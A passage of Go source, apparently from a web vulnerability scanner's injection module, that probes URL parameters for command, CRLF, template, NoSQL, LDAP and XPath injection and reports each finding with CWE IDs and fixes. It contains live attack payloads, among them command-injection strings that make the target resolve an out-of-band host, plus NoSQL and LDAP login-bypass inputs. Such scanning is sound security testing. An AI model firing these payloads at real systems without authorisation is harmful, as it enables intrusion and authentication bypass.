			}
		}

		for _, tp := range inject.CMDITimePayloads() {
			select {
			case <-ctx.Done():
				return findings
			default:
			}

			testURL := m.buildURL(parsed, params, paramName, tp)
			start := time.Now()
			resp, err := m.client.Get(testURL)
			elapsed := time.Since(start).Seconds()
			if err != nil {
				continue
			}
			_ = resp

			if elapsed >= 4.0 && elapsed > baselineTime+2 {
				findings = append(findings, &models.Finding{
					Title:       "OS Command Injection - Time Based",
					Severity:    models.Critical,
					Confidence:  models.HighConfidence,
					URL:         testURL,
					Parameter:   paramName,
					Payload:     tp,
					Evidence:    fmt.Sprintf("Response delay: %.2fs (baseline: %.2fs)", elapsed, baselineTime),
					Description: fmt.Sprintf("Parameter '%s' causes time delays matching sleep/ping commands.", paramName),
					Remediation: "Never pass user input directly to system commands. Use parameterized APIs.",
					CWEID:       "CWE-78",
					ModuleID:    "inject",
				})
				goto nextParamCMDi
			}
		}

		m.blindCMDITest(ctx, parsed, params, paramName)

	nextParamCMDi:
	}

	return findings
}

func (m *AdvancedInjectModule) blindCMDITest(ctx context.Context, parsed *url.URL, params url.Values, paramName string) {
	marker := inject.UniqueMarker("CMDI")
	blindCMDi := []string{
		";nslookup %s.interact.fang.xyz",
		"|nslookup %s.interact.fang.xyz",
		"`nslookup %s.interact.fang.xyz`",
		"$(nslookup %s.interact.fang.xyz)",
	}
	for _, bcp := range blindCMDi {
		select {
		case <-ctx.Done():
			return
		default:
		}

		payload := fmt.Sprintf(bcp, marker)
		testURL := m.buildURL(parsed, params, paramName, payload)
		m.client.Get(testURL)
	}
}

func (m *AdvancedInjectModule) scanCRLF(ctx context.Context, target *models.Target) []*models.Finding {
	var findings []*models.Finding

	parsed, err := url.Parse(target.URL)
	if err != nil {
		return nil
	}

	params, _ := url.ParseQuery(parsed.RawQuery)
	paramNames := make([]string, 0, len(params))
	for k := range params {
		paramNames = append(paramNames, k)
	}
	if len(paramNames) == 0 {
		paramNames = []string{"url", "redirect", "next", "return", "redir", "path", "page", "ref", "link", "go", "out", "to", "dest", "location"}
	}

	crlfEncodings := []string{
		"%0d%0a",
		"%0D%0A",
		"%0d%0a%0d%0a",
		"%0D%0A%0D%0A",
		"\r\n",
		"%0a%0d",
		"%00%0d%0a",
	}

	for _, paramName := range paramNames {
		for _, encoding := range crlfEncodings {
			select {
			case <-ctx.Done():
				return findings
			default:
			}

			injectionHeader := fmt.Sprintf("X-Fang-Injected: crlf-test-%s", inject.UniqueMarker("CRLF"))
			payload := encoding + url.QueryEscape(injectionHeader)
			testURL := m.buildURL(parsed, params, paramName, payload)

			resp, err := m.client.Get(testURL)
			if err != nil {
				continue
			}

			for headerName := range resp.Headers {
				if strings.Contains(strings.ToLower(headerName), "fang-injected") {
					findings = append(findings, &models.Finding{
						Title:       "CRLF Injection Found",
						Severity:    models.High,
						Confidence:  models.HighConfidence,
						URL:         testURL,
						Parameter:   paramName,
						Payload:     fmt.Sprintf("%s%s", encoding, "X-Fang-Injected: injected"),
						Evidence:    fmt.Sprintf("Injected header found in response: %s", headerName),
						Description: fmt.Sprintf("Parameter '%s' is vulnerable to CRLF injection. Attackers can inject arbitrary HTTP headers and potentially perform cache poisoning or response splitting.", paramName),
						Remediation: "Sanitize input by removing CR (0x0d) and LF (0x0a) characters from user input. Use URL encoding functions safely.",
						CWEID:       "CWE-93",
						ModuleID:    "inject",
					})
					goto nextParamCRLF
				}
			}

			for headerName, headerValues := range resp.Headers {
				for _, hv := range headerValues {
					if strings.Contains(strings.ToLower(hv), "crlf-test") {
						findings = append(findings, &models.Finding{
							Title:       "CRLF Injection Found (Response Splitting)",
							Severity:    models.High,
							Confidence:  models.HighConfidence,
							URL:         testURL,
							Parameter:   paramName,
							Payload:     fmt.Sprintf("%s%s", encoding, "X-Fang-Injected: injected"),
							Evidence:    fmt.Sprintf("Injected content in header %s: %s", headerName, hv),
							Description: fmt.Sprintf("Parameter '%s' is vulnerable to CRLF injection with response splitting.", paramName),
							Remediation: "Sanitize input by removing CR and LF characters. Use language-safe encoding functions.",
							CWEID:       "CWE-93",
							ModuleID:    "inject",
						})
						goto nextParamCRLF
					}
				}
			}
		}
	nextParamCRLF:
	}

	return findings
}

func (m *AdvancedInjectModule) scanSSTI(ctx context.Context, target *models.Target) []*models.Finding {
	var findings []*models.Finding

	parsed, err := url.Parse(target.URL)
	if err != nil {
		return nil
	}

	params, _ := url.ParseQuery(parsed.RawQuery)
	paramNames := make([]string, 0, len(params))
	for k := range params {
		paramNames = append(paramNames, k)
	}
	if len(paramNames) == 0 {
		paramNames = []string{"name", "message", "content", "template", "page", "input", "text", "data", "q", "s", "user", "email", "subject", "body", "title"}
	}

	for _, paramName := range paramNames {
		select {
		case <-ctx.Done():
			return findings
		default:
		}

		var baselineVal string
		if vals, ok := params[paramName]; ok && len(vals) > 0 {
			baselineVal = vals[0]
		} else {
			baselineVal = "test"
		}

		baselineURL := m.buildURL(parsed, params, paramName, baselineVal)
		baselineResp, err := m.client.Get(baselineURL)
		if err != nil {
			continue
		}

		polyglotMath := "{{7*7}}${7*7}#{7*7}"
		polyglotURL := m.buildURL(parsed, params, paramName, polyglotMath)
		polyglotResp, err := m.client.Get(polyglotURL)
		if err != nil {
			continue
		}
		polyglotBody := polyglotResp.Body

		if strings.Contains(polyglotBody, "49") && !strings.Contains(baselineResp.Body, "49") {
			findings = append(findings, &models.Finding{
				Title:       "SSTI - Template Evaluation (Polyglot Math)",
				Severity:    models.Critical,
				Confidence:  models.HighConfidence,
				URL:         polyglotURL,
				Parameter:   paramName,
				Payload:     polyglotMath,
				Evidence:    "7*7 evaluated to 49 in response",
				Description: fmt.Sprintf("Parameter '%s' evaluates template expressions. The server processed {{7*7}}, ${7*7}, or #{7*7} as code.", paramName),
				Remediation: "Do not render user input in template engines. Use sandboxed template environments if necessary.",
				CWEID:       "CWE-1336",
				ModuleID:    "inject",
			})
			continue
		}

		for _, jt := range inject.SSTIJinja2Payloads() {
			select {
			case <-ctx.Done():
				return findings
			default:
			}
			testURL := m.buildURL(parsed, params, paramName, jt.Value)
			resp, err := m.client.Get(testURL)
			if err != nil {
				continue
			}

			if strings.Contains(resp.Body, jt.Check) && !strings.Contains(baselineResp.Body, jt.Check) {
				findings = append(findings, &models.Finding{
					Title:       "SSTI - Jinja2/Twig Template Engine",
					Severity:    models.Critical,
					Confidence:  models.HighConfidence,
					URL:         testURL,
					Parameter:   paramName,
					Payload:     jt.Value,
					Evidence:    fmt.Sprintf("Template expression evaluated: %s", jt.Check),
					Description: fmt.Sprintf("Parameter '%s' is vulnerable to Jinja2/Twig SSTI.", paramName),
					Remediation: "Disable template evaluation on user-controlled input. Use sandboxed templates.",
					CWEID:       "CWE-1336",
					ModuleID:    "inject",
				})
				goto nextParamSSTI
			}
		}

		for _, ft := range inject.SSTIFreeMarkerPayloads() {
			select {
			case <-ctx.Done():
				return findings
			default:
			}
			testURL := m.buildURL(parsed, params, paramName, ft.Value)
			resp, err := m.client.Get(testURL)
			if err != nil {
				continue
			}

			if strings.Contains(resp.Body, ft.Check) && !strings.Contains(baselineResp.Body, ft.Check) {
				findings = append(findings, &models.Finding{
					Title:       "SSTI - FreeMarker Template Engine",
					Severity:    models.Critical,
					Confidence:  models.HighConfidence,
					URL:         testURL,
					Parameter:   paramName,
					Payload:     ft.Value,
					Evidence:    fmt.Sprintf("FreeMarker expression evaluated: %s", ft.Check),
					Description: fmt.Sprintf("Parameter '%s' is vulnerable to FreeMarker SSTI.", paramName),
					Remediation: "Sanitize user input before template rendering. Use template sandboxing.",
					CWEID:       "CWE-1336",
					ModuleID:    "inject",
				})
				goto nextParamSSTI
			}
		}

		for _, vt := range inject.SSTIVelocityPayloads() {
			select {
			case <-ctx.Done():
				return findings
			default:
			}
			testURL := m.buildURL(parsed, params, paramName, vt.Value)
			resp, err := m.client.Get(testURL)
			if err != nil {
				continue
			}

			if strings.Contains(resp.Body, vt.Check) && !strings.Contains(baselineResp.Body, vt.Check) {
				findings = append(findings, &models.Finding{
					Title:       "SSTI - Velocity Template Engine",
					Severity:    models.Critical,
					Confidence:  models.HighConfidence,
					URL:         testURL,
					Parameter:   paramName,
					Payload:     vt.Value,
					Evidence:    fmt.Sprintf("Velocity expression evaluated: %s", vt.Check),
					Description: fmt.Sprintf("Parameter '%s' is vulnerable to Velocity SSTI.", paramName),
					Remediation: "Do not pass user input to Velocity templates. Use strict input validation.",
					CWEID:       "CWE-1336",
					ModuleID:    "inject",
				})
				goto nextParamSSTI
			}
		}

		for _, ep := range inject.SSTIErrorPatterns() {
			select {
			case <-ctx.Done():
				return findings
			default:
			}
			testURL := m.buildURL(parsed, params, paramName, "{{")
			resp, err := m.client.Get(testURL)
			if err != nil {
				continue
			}

			respBody := strings.ToLower(resp.Body)
			if strings.Contains(respBody, strings.ToLower(ep)) && !strings.Contains(strings.ToLower(baselineResp.Body), strings.ToLower(ep)) {
				findings = append(findings, &models.Finding{
					Title:       "SSTI - Error Based Detection",
					Severity:    models.High,
					Confidence:  models.MediumConfidence,
					URL:         testURL,
					Parameter:   paramName,
					Payload:     "{{",
					Evidence:    fmt.Sprintf("Template error detected: %s", ep),
					Description: fmt.Sprintf("Parameter '%s' reveals template engine errors suggesting SSTI vulnerability.", paramName),
					Remediation: "Disable detailed error messages in production. Sanitize template inputs.",
					CWEID:       "CWE-1336",
					ModuleID:    "inject",
				})
				break
			}
		}

	nextParamSSTI:
	}

	return findings
}

func (m *AdvancedInjectModule) scanNoSQLi(ctx context.Context, target *models.Target) []*models.Finding {
	var findings []*models.Finding

	parsed, err := url.Parse(target.URL)
	if err != nil {
		return nil
	}

	params, _ := url.ParseQuery(parsed.RawQuery)
	paramNames := make([]string, 0, len(params))
	for k := range params {
		paramNames = append(paramNames, k)
	}
	if len(paramNames) == 0 {
		paramNames = []string{"id", "user", "username", "email", "pass", "password", "token", "session", "auth", "search", "q", "name", "key"}
	}

	neqPayloads := []struct {
		payload string
		desc    string
	}{
		{"{\"$ne\": null}", "$ne null"},
		{"{\"$ne\": \"\"}", "$ne empty"},
		{"{\"$gt\": \"\"}", "$gt empty"},
		{"{\"$regex\": \".*\"}", "$regex .*"},
		{"{\"$exists\": true}", "$exists true"},
		{"{\"$in\": [\"admin\", \"user\"]}", "$in array"},
		{"{\"$nin\": [\"nonexistent\"]}", "$nin"},
	}

	for _, paramName := range paramNames {
		select {
		case <-ctx.Done():
			return findings
		default:
		}

		var baselineVal string
		if vals, ok := params[paramName]; ok && len(vals) > 0 {
			baselineVal = vals[0]
		} else {
			baselineVal = "test"
		}

		baselineURL := m.buildURL(parsed, params, paramName, baselineVal)
		baselineResp, err := m.client.Get(baselineURL)
		if err != nil {
			continue
		}

		for _, p := range inject.NoSQLPayloads() {
			select {
			case <-ctx.Done():
				return findings
			default:
			}

			testURL := m.buildURL(parsed, params, paramName, p)
			resp, err := m.client.Get(testURL)
			if err != nil {
				continue
			}

			respBody := strings.ToLower(resp.Body)
			for _, errMsg := range inject.NoSQLErrorPatterns() {
				if strings.Contains(respBody, strings.ToLower(errMsg)) {
					findings = append(findings, &models.Finding{
						Title:       "NoSQL Injection - Error Based",
						Severity:    models.Critical,
						Confidence:  models.HighConfidence,
						URL:         testURL,
						Parameter:   paramName,
						Payload:     p,
						Evidence:    fmt.Sprintf("NoSQL error detected: %s", errMsg),
						Description: fmt.Sprintf("Parameter '%s' is vulnerable to NoSQL injection.", paramName),
						Remediation: "Sanitize NoSQL query inputs. Use parameterized queries for MongoDB. Validate input types.",
						CWEID:       "CWE-943",
						ModuleID:    "inject",
					})
					goto nextParamNoSQL
				}
			}
		}

		for _, np := range neqPayloads {
			select {
			case <-ctx.Done():
				return findings
			default:
			}

			testURL := m.buildURL(parsed, params, paramName, np.payload)
			resp, err := m.client.Get(testURL)
			if err != nil {
				continue
			}

			if resp.StatusCode == 200 && !strings.Contains(strings.ToLower(resp.Body), "error") {
				if len(resp.Body) != len(baselineResp.Body) || resp.StatusCode != baselineResp.StatusCode {
					findings = append(findings, &models.Finding{
						Title:       fmt.Sprintf("NoSQL Injection - %s", np.desc),
						Severity:    models.High,
						Confidence:  models.MediumConfidence,
						URL:         testURL,
						Parameter:   paramName,
						Payload:     np.payload,
						Evidence:    fmt.Sprintf("NoSQL operator %s produced different response", np.desc),
						Description: fmt.Sprintf("Parameter '%s' responds to NoSQL operators, suggesting a MongoDB-backed endpoint.", paramName),
						Remediation: "Validate and sanitize JSON inputs. Use parameterized queries. Avoid exposing raw query operators.",
						CWEID:       "CWE-943",
						ModuleID:    "inject",
					})
					break
				}
			}
		}

		if strings.Contains(strings.ToLower(target.URL), "json") || strings.Contains(strings.ToLower(target.URL), "api") {
			jsonPayloads := []string{
				`{"username": {"$ne": null}, "password": {"$ne": null}}`,
				`{"$or": [{"username": "admin"}, {"username": {"$ne": null}}], "password": {"$ne": null}}`,
				`{"username": "admin", "password": {"$regex": ".*"}}`,
				`{"username": {"$gt": ""}, "password": {"$gt": ""}}`,
			}
			for _, jp := range jsonPayloads {
				select {
				case <-ctx.Done():
					return findings
				default:
				}

				resp, err := m.client.DoRaw("POST", target.URL, map[string]string{"Content-Type": "application/json"}, jp)
				if err != nil {
					continue
				}

				if resp.StatusCode == 200 && len(resp.Body) > 0 && !strings.Contains(strings.ToLower(resp.Body), "error") {
					findings = append(findings, &models.Finding{
						Title:       "NoSQL Injection - JSON Body",
						Severity:    models.Critical,
						Confidence:  models.MediumConfidence,
						URL:         target.URL,
						Parameter:   "body",
						Payload:     truncatePayload(jp, 80),
						Evidence:    "JSON NoSQL injection payload accepted without error",
						Description: "The JSON endpoint accepts NoSQL operators in request body, suggesting NoSQL injection vulnerability.",
						Remediation: "Validate JSON input before passing to NoSQL queries. Use parameterized queries.",
						CWEID:       "CWE-943",
						ModuleID:    "inject",
					})
					break
				}
			}
		}

	nextParamNoSQL:
	}

	return findings
}

func (m *AdvancedInjectModule) scanLDAP(ctx context.Context, target *models.Target) []*models.Finding {
	var findings []*models.Finding

	parsed, err := url.Parse(target.URL)
	if err != nil {
		return nil
	}

	params, _ := url.ParseQuery(parsed.RawQuery)
	paramNames := make([]string, 0, len(params))
	for k := range params {
		paramNames = append(paramNames, k)
	}
	if len(paramNames) == 0 {
		paramNames = []string{"user", "username", "uid", "cn", "dn", "search", "filter", "domain", "name", "email", "group", "ou", "dc"}
	}

payloadLoopLDAP:
	for _, paramName := range paramNames {
		select {
		case <-ctx.Done():
			return findings
		default:
		}

		var baselineVal string
		if vals, ok := params[paramName]; ok && len(vals) > 0 {
			baselineVal = vals[0]
		} else {
			baselineVal = "test"
		}

		baselineURL := m.buildURL(parsed, params, paramName, baselineVal)
		baselineResp, err := m.client.Get(baselineURL)
		if err != nil {
			continue
		}

		ldapFilterPayloads := []string{
			"*)(uid=*))(|(uid=*",
			"*)(|(cn=*))",
			"*)(|(password=*))",
			"admin*)((|userPassword=*)",
			"*)(uid=*))(|(uid=*",
			"*)(|(uid=*))",
			"admin*",
			"*",
			"*))(|(cn=",
			"*)(cn=*))(|(cn=",
			"admin*)((|userPassword=*)",
			"test*))(|(userPassword=test",
		}
		for _, lp := range ldapFilterPayloads {
			select {
			case <-ctx.Done():
				return findings
			default:
			}

			testURL := m.buildURL(parsed, params, paramName, lp)
			resp, err := m.client.Get(testURL)
			if err != nil {
				continue
			}

			if resp.StatusCode == 200 && len(resp.Body) > 0 && resp.StatusCode == baselineResp.StatusCode {
				if absInt(len(resp.Body)-len(baselineResp.Body)) > 50 {
					findings = append(findings, &models.Finding{
						Title:       "LDAP Injection - Possible Filter Bypass",
						Severity:    models.Critical,
						Confidence:  models.MediumConfidence,
						URL:         testURL,
						Parameter:   paramName,
						Payload:     lp,
						Evidence:    fmt.Sprintf("LDAP filter injection payload altered response: baseline %d bytes, test %d bytes", len(baselineResp.Body), len(resp.Body)),
						Description: fmt.Sprintf("Parameter '%s' appears vulnerable to LDAP injection. LDAP filter manipulation may be possible.", paramName),
						Remediation: "Escape LDAP special characters (*, (, ), \\, NUL) before constructing filters. Use parameterized LDAP queries.",
						CWEID:       "CWE-90",
						ModuleID:    "inject",
					})
					continue payloadLoopLDAP
				}
			}

			if strings.Contains(strings.ToLower(resp.Body), "ldap") ||
				strings.Contains(strings.ToLower(resp.Body), "protocol error") ||
				strings.Contains(strings.ToLower(resp.Body), "malformed filter") ||
				strings.Contains(strings.ToLower(resp.Body), "bad search filter") {
				findings = append(findings, &models.Finding{
					Title:       "LDAP Injection - Error Based",
					Severity:    models.High,
					Confidence:  models.HighConfidence,
					URL:         testURL,
					Parameter:   paramName,
					Payload:     lp,
					Evidence:    "LDAP filter processing error detected in response",
					Description: fmt.Sprintf("Parameter '%s' triggers LDAP filter processing errors, confirming LDAP injection is possible.", paramName),
					Remediation: "Escape LDAP special characters before constructing filters. Use prepared LDAP statements.",
					CWEID:       "CWE-90",
					ModuleID:    "inject",
				})
				continue payloadLoopLDAP
			}
		}

		ldapBlindPayloads := []string{
			"admin)(&)",
			"admin)(!(",
			"*)(uid=*",
			"*)(cn=*",
		}
		for _, bp := range ldapBlindPayloads {
			select {
			case <-ctx.Done():
				return findings
			default:
			}

			testURL := m.buildURL(parsed, params, paramName, bp)
			resp, err := m.client.Get(testURL)
			if err != nil {
				continue
			}

			if resp.StatusCode == baselineResp.StatusCode && len(resp.Body) > 0 {
				findings = append(findings, &models.Finding{
					Title:       "LDAP Injection - Blind Possible",
					Severity:    models.Medium,
					Confidence:  models.Tentative,
					URL:         testURL,
					Parameter:   paramName,
					Payload:     bp,
					Evidence:    "Blind LDAP injection payload produced valid response",
					Description: fmt.Sprintf("Parameter '%s' may be vulnerable to blind LDAP injection.", paramName),
					Remediation: "Escape LDAP special characters. Use parameterized queries with proper input validation.",
					CWEID:       "CWE-90",
					ModuleID:    "inject",
				})
			}
		}
	}

	return findings
}

func (m *AdvancedInjectModule) scanXPath(ctx context.Context, target *models.Target) []*models.Finding {
	var findings []*models.Finding

	parsed, err := url.Parse(target.URL)
	if err != nil {
		return nil
	}

	params, _ := url.ParseQuery(parsed.RawQuery)
	paramNames := make([]string, 0, len(params))
	for k := range params {
		paramNames = append(paramNames, k)
	}
	if len(paramNames) == 0 {
		paramNames = []string{"id", "user", "name", "category", "item", "product", "q", "search", "filter", "type", "page", "lang", "xml"}
	}

payloadLoopXPath:
	for _, paramName := range paramNames {
		select {
		case <-ctx.Done():
			return findings
		default:
		}

		var baselineVal string
		if vals, ok := params[paramName]; ok && len(vals) > 0 {
			baselineVal = vals[0]
		} else {
			baselineVal = "test"
		}

		baselineURL := m.buildURL(parsed, params, paramName, baselineVal)
		_, err := m.client.Get(baselineURL)
		if err != nil {
			continue
		}

		xpathBooleanPayloads := []struct {
			trueVal  string
			falseVal string
			desc     string
		}{
			{"' and '1'='1", "' and '1'='2", "Boolean Blind"},
			{"' or '1'='1", "' or '1'='2", "Boolean Or"},
			{"1 and 1=1", "1 and 1=2", "Numeric Boolean"},
			{"1 or 1=1", "1 or 1=2", "Numeric Or"},
		}
		for _, xp := range xpathBooleanPayloads {
			select {
			case <-ctx.Done():
				return findings
			default:
			}

			trueURL := m.buildURL(parsed, params, paramName, xp.trueVal)
			falseURL := m.buildURL(parsed, params, paramName, xp.falseVal)

			trueResp, err := m.client.Get(trueURL)
			if err != nil {
				continue
			}

			falseResp, err := m.client.Get(falseURL)
			if err != nil {
				continue
			}

			diff := absInt(len(trueResp.Body) - len(falseResp.Body))
			if diff > 50 && len(trueResp.Body) > 0 {
				findings = append(findings, &models.Finding{
					Title:       fmt.Sprintf("XPath Injection - %s", xp.desc),
					Severity:    models.High,
					Confidence:  models.MediumConfidence,
					URL:         trueURL,
					Parameter:   paramName,
					Payload:     xp.trueVal,
					Evidence:    fmt.Sprintf("Response difference of %d bytes between true and false conditions", diff),
					Description: fmt.Sprintf("Parameter '%s' shows different responses for true/false XPath conditions, suggesting XPath injection.", paramName),
					Remediation: "Use parameterized XPath queries. Sanitize user input by escaping special characters like ', \", /, @, =, *, [, ].",
					CWEID:       "CWE-643",
					ModuleID:    "inject",
				})
				continue payloadLoopXPath
			}
		}

		xpathErrorPayloads := []string{
			"'",
			"'\"",
			"' and '1'='1",
			"@*",
			"/*",
			"//*",
			"..|..",
			"' and count(/*)=1 and '1'='1",
			"' and count(/*)=2 and '1'='1",
			"string(//user[1]/username)",
			"' | //user/* | '",
		}
		for _, xp := range xpathErrorPayloads {
			select {
			case <-ctx.Done():
				return findings
			default:
			}

			testURL := m.buildURL(parsed, params, paramName, xp)
			resp, err := m.client.Get(testURL)
			if err != nil {
				continue
			}

			respBody := strings.ToLower(resp.Body)
			if strings.Contains(respBody, "xpath") ||
				strings.Contains(respBody, "xpath exception") ||
				strings.Contains(respBody, "system.xml.xpath") ||
				strings.Contains(respBody, "saxon") ||
				strings.Contains(respBody, "msxsl") {
				findings = append(findings, &models.Finding{
					Title:       "XPath Injection - Error Based",
					Severity:    models.High,
					Confidence:  models.HighConfidence,
					URL:         testURL,
					Parameter:   paramName,
					Payload:     xp,
					Evidence:    "XPath processing error detected in response",
					Description: fmt.Sprintf("Parameter '%s' triggers XPath processing errors, confirming XPath injection vulnerability.", paramName),
					Remediation: "Use parameterized XPath queries. Disable detailed XPath error messages in production.",
					CWEID:       "CWE-643",
					ModuleID:    "inject",
				})
				continue payloadLoopXPath
			}
		}
	}

	return findings
}

func init() {
	engine.GetRegistry().Register(&AdvancedInjectModule{})
}
